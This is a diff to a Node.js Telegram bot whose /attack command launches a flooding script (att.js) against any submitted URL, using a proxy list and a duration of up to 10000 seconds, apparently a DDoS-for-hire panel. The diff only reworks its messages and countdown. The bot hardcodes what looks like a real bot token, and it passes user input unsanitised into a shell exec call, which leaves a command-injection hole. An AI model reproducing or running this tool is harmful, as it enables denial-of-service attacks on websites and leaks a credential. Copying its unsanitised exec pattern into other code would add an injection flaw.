@@ -1,10 +1,8 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 
-
 const token = '6744405305:AAHa1Rd_0JLYDNu1Jh87Knu0Xl7OArNzcAA';
 const bot = new TelegramBot(token, { polling: true });
-
 
 function isValidURL(url) {
     try {
@@ -24,29 +22,27 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
     const numChars = args[3] || 10;
     const proxyFile = args[4] || 'proxy.txt';
 
-
     if (!isValidURL(target)) {
-        bot.sendMessage(chatId, 'Please provide a valid URL.Also Read Usage: /attack www.example.com 100');
+        bot.sendMessage(chatId, 'Please provide a valid URL. Usage: /attack www.example.com 100');
         return;
     }
+
     if (isNaN(time) || time < 60 || time > 10000) {
         bot.sendMessage(chatId, 'Time must be between 60 and 10000');
-                return;
+        return;
     }
 
-
     const command = `node att.js ${target} ${time} ${numWords} ${numChars} ${proxyFile}`;
+
     exec(command, (error, stdout, stderr) => {
         if (error) {
-            bot.sendMessage(chatId, `ATTACK SUCCESSFULLY END`);
+            bot.sendMessage(chatId, 'Error occurred while running the attack.');
         } else {
             bot.sendMessage(chatId, '😈 ATTACK START 😈');
+            setTimeout(() => {
+                bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
+            }, 30000);
         }
     });
-
-
-    bot.sendMessage(chatId, 'Countdown: 30 seconds');
-    setTimeout(() => {
-        bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
-    }, 30000);
 });
+                   
